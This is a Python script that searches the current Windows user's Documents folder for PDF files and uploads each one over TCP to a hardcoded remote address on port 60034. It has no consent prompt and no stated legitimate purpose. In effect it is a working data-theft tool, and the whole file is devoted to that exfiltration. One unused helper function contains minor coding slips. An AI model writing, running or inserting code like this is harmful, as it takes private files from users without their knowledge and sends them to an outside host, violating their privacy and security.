import socket
import tqdm
import os
import argparse
import time
BUFFER_SIZE = 512 * 4

import os
username = os.environ['USERNAME']
all_files = []

def findPdfs():
    for dirpath, dirnames, filenames in os.walk(f"C:\\Users\\{username}\\Documents\\"):
        for filename in [f for f in filenames if f.endswith(".pdf")]:
            all_files.append(os.path.join(dirpath, filename))
    
    return all_files

def sendFile(files, host, port):

    for file in files:
        s = socket.socket()
        s.connect((host,port))
        filesize = int(os.path.getsize(file))
        progress = tqdm.tqdm(range(filesize), f"Sending {file}", unit="B", unit_scale=True, unit_divisor=1024)

        f = open (file, "rb")
        l = f.read(1024)
        while (l):
            s.send(l)
            l = f.read(1024)
            progress.update(len(l))
        
        f.close()
        s.close()

def send_file(files, host, port):
    # get the file size
    # create the client socket
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")

    for filename in files:
        # send the filename and filesize
        filesize = os.path.getsize(filename)
        s.send(f"{filename},{filesize}".encode())
        print(f"Sending {filename} now...")

        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    s.sendfile
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))



    # close the socket
    s.close()

if __name__ == "__main__":
    files = findPdfs()
    host = "1.1.1.1"
    port = 60034
    if len(files) > 0:
        sendFile(files, host, port)